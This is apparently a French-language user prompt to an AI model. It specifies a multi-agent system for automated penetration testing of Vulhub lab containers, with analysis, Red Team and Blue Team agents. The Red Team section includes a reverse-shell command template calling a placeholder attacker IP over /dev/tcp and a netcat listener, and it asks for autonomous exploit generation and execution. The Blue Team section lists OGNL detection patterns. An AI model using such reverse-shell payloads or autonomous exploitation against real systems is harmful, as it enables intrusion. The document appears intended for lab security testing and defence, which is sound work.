

Salut Claude,

Nous reprenons à zéro la conception d'un projet ambitieux : un écosystème multi-agents pour l'automatisation de tests d'intrusion. Les tentatives précédentes n'ont pas atteint le niveau de robustesse et d'intelligence requis. Ta mission est de reprendre le leadership technique sur ce projet, en t'appuyant sur une architecture claire et des agents spécialisés et performants.

**Lis ce document attentivement et dans son intégralité.** Il définit l'architecture, les responsabilités de chaque composant et les "contrats d'interface" entre eux.

---

### **## 1. Vision Globale & Architecture de l'Écosystème**

Notre objectif est de créer un système capable d'auditer une machine cible, d'identifier une vulnérabilité, de générer un exploit sur mesure, de l'exécuter, et enfin de proposer une remédiation.

**L'écosystème repose sur une architecture Docker-composée et distribuée :**

1.  **Conteneur de Contrôle (Le tien, celui où tu travailles)** :
    *   Héberge les **Notebooks Jupyter** pour l'orchestration et le développement.
    *   Contient le **code des agents** (Analyse, Red Team, Blue Team).
    *   Accède aux bases de données vectorielles **ChromaDB**.
    *  expose une API OLLAMA pour le LLM (ex: `http://ollama-host:11434`). 





3.  **Conteneur(s) Cible (Vulhub)** :
    *   Ce sont les VMs ou conteneurs Docker vulnérables, issus du projet **Vulhub**.
    *   Ils exposent des services (web, etc.) sur le réseau Docker.
    *   L'agent de contrôle interagit avec eux via leurs **adresses IP et ports sur le réseau Docker**.

**Diagramme de Flux Logique :**
`Utilisateur` -> `Orchestrateur` -> `Agent Analyse` -> `Agent Red Team` -> `Cible` -> `Agent Blue Team`

---

### **## 2. Le Cœur du Système : L'Orchestrateur Intelligent**

L'orchestrateur (`notebook_06_orchestrator.ipynb`) n'est pas juste un script linéaire. Il doit :
*   Maintenir l'état de l'audit dans un **objet "contexte"** (un dictionnaire Python) qui est enrichi à chaque étape.
*   Gérer la logique de transition entre les agents.

**Workflow de l'Orchestrateur :**
1.  **Initialisation :** Demande à l'utilisateur l'ID de la vulnérabilité Vulhub (ex: `struts2/s2-001`) et l'adresse de la cible (`http://cible-vulhub:8080`).
2.  **Phase 1 - Analyse :** Invoque `VulnerabilityAnalyzerAgent` avec l'ID et la cible. Récupère un rapport JSON.
3.  **Phase 2 - Attaque :** Invoque `RedTeamAgent` avec le rapport d'analyse et la cible. Récupère un rapport d'exploitation.
4.  **Phase 3 - Défense :** Invoque `BlueTeamAgent` avec les rapports précédents. Récupère un plan de remédiation.
5.  **Affichage final :** Présente un résumé complet de l'audit.

---

### **## 3. Mission 1 : Refonte de l'Agent d'Analyse (Vulnerability Analyzer)**

L'approche actuelle qui consiste à parser la sortie texte du LLM est fragile. Nous devons la revoir.

**Nouveau Workflow de l'Agent d'Analyse :**
1.  **Input :** ID Vulhub (`struts2/s2-001`), adresse cible (`http://cible-vulhub:8080`).
2.  **RAG Query :** Récupère la documentation (`README.md` + `docker-compose.yml`) depuis la base `vulhub_chroma_db`.
3.  **Extraction Structurée (La partie à corriger) :**
    *   Le LLM doit être "contraint" de produire un JSON. Pour ce faire, nous allons utiliser une technique plus avancée. Au lieu d'un simple prompt, tu utiliseras une librairie comme **`Pydantic` avec LangChain** pour définir un schéma de sortie. Le LLM sera forcé de respecter ce schéma.
    *   **Schéma Pydantic à extraire :**
        ```python
        class VulhubInfo(BaseModel):
            cve_id: Optional[str] = Field(description="L'identifiant CVE principal, si trouvé.")
            attack_type: str = Field(description="Le type d'attaque (ex: 'Remote Code Execution', 'SQL Injection').")
            target_service: str = Field(description="Le service ou logiciel affecté (ex: 'Apache Struts2').")
            reproduction_steps_summary: str = Field(description="Un résumé en langage naturel des étapes de reproduction.")
            # La clé est d'extraire des PAYLOADS, pas des commandes complètes.
            payloads: List[str] = Field(description="Une liste de payloads bruts trouvés dans la documentation.")
        ```
4.  **Confirmation Active :** L'agent utilise ses outils pour valider la vulnérabilité.
    *   **`web_prober(target, payload)` :** C'est un outil **crucial**. Il prend une cible et un payload. S'il s'agit d'une vulnérabilité web, il doit savoir comment injecter le payload (dans un paramètre GET, POST, un header, etc.). Il peut avoir besoin du LLM pour l'aider à construire la requête finale.
    *   **`network_scanner` :** Vérifie les ports ouverts (basé sur le `docker-compose.yml`).
5.  **Output :** Produit le fichier **`analysis_report.json`** avec une structure claire et validée.

---

### **## 4. Mission 2 : Développement de l'Agent Red Team**

C'est la partie la plus créative. Cet agent ne se contente pas d'exécuter, il **CRÉE** un exploit.

**Workflow de l'Agent Red Team :**
1.  **Input :** `analysis_report.json`, informations sur la cible (IP, OS si connu).
2.  **Raisonnement Stratégique :**
    *   L'agent analyse le rapport. Exemple : "OK, c'est une RCE sur Struts2 via une injection OGNL. Le payload de la doc est basique (`whoami`). Je peux faire mieux."
    *   Il interroge la base **`enhanced_vple_chroma_db`** avec le type d'attaque ("Remote Code Execution") et la CVE. Il cherche des documents **ATOMIC RED TEAM** pour trouver des techniques plus avancées.
    *   **Objectif :** Obtenir un "reverse shell".
3.  **GÉNÉRATION DE SCRIPT D'EXPLOITATION :**
    *   C'est l'étape la plus importante. Le LLM doit **générer un script complet et autonome** (`.py`, `.sh`, `.ps1`) pour réaliser l'exploitation. Ce n'est PAS juste une commande.
    *   **Exemple pour une vulnérabilité web :** Le LLM doit générer un script **Python** qui utilise la librairie `requests`. Ce script construira la requête HTTP malveillante, y compris le payload de reverse shell (ex: `bash -c 'bash -i >& /dev/tcp/IP_ATTAQUANT/PORT ...'`), et l'enverra à la cible.
    *   **Exemple pour un accès CLI :** Si l'analyse révèle des identifiants SSH, le LLM doit générer un script qui utilise `paramiko` (Python) ou `sshpass` (Bash) pour se connecter.
    *   Le script généré doit être sauvegardé localement (ex: `exploit.py`).
4.  **Exécution de l'Exploit :**
    *   L'agent exécute le script qu'il vient de créer (`python exploit.py`).
    *   Il doit gérer un "listener" (ex: `netcat -lvp PORT`) en parallèle pour attraper le reverse shell si nécessaire.
5.  **Output :** Produit un **`exploitation_report.json`** qui contient :
    *   Le code source du script généré.
    *   La sortie de l'exécution (succès, erreur).
    *   Les preuves de compromission (ex: "Reverse shell obtenu", sortie de la commande `id`).

---

### **## 5. Mission 3 : Ébauche de l'Agent Blue Team**

Cet agent analyse les actions de l'Agent Red Team pour proposer des défenses.

**Workflow de l'Agent Blue Team :**
1.  **Input :** `analysis_report.json` et `exploitation_report.json`.
2.  **Analyse des Artefacts :**
    *   **Analyse du script d'exploit :** Le LLM examine le code de `exploit.py` pour comprendre la méthode exacte de l'attaque.
    *   **Analyse du trafic (simulé) :** Il analyse la requête construite par le script (ex: "POST /struts2-showcase/index.action" avec un payload OGNL).
3.  **Génération de Recommandations :** Le LLM produit un rapport de remédiation.
    *   **Correction à court terme :** "Mettre à jour la librairie Apache Struts vers la version X.X.X."
    *   **Détection :** "Créer une règle de pare-feu applicatif (WAF) pour bloquer les requêtes contenant les motifs OGNL ('#context', '#memberAccess')."
    *   **Supervision :** "Surveiller les logs du serveur d'application pour détecter les exceptions Java liées à l'évaluation d'expressions OGNL."

---

### **## 6. Instructions Finales pour Toi**

1.  **Ré-architecture le projet** en suivant ce plan. Tu peux créer de nouveaux notebooks si nécessaire (`05_agent_analyzer_revamped.ipynb`, `07_agent_red_team.ipynb`, `08_agent_blue_team.ipynb`).
2.  **Priorise la robustesse.** L'utilisation de Pydantic pour l'Agent d'Analyse n'est pas négociable.
3.  **Focalise-toi sur la génération de scripts d'exploitation** pour l'Agent Red Team. C'est le cœur de l'intelligence du système. Montre un exemple clair pour une vulnérabilité web.
4.  **Le code doit être modulaire.** Chaque agent doit être une classe Python distincte et bien définie.
5.  Fournis le code complet pour chaque notebook, en expliquant tes choix d'architecture dans les commentaires et les cellules Markdown.

Ce cahier des charges est complet. Je m'attends à une solution de haute qualité qui reflète cette vision. Commence par l'Agent d'Analyse revu et corrigé.
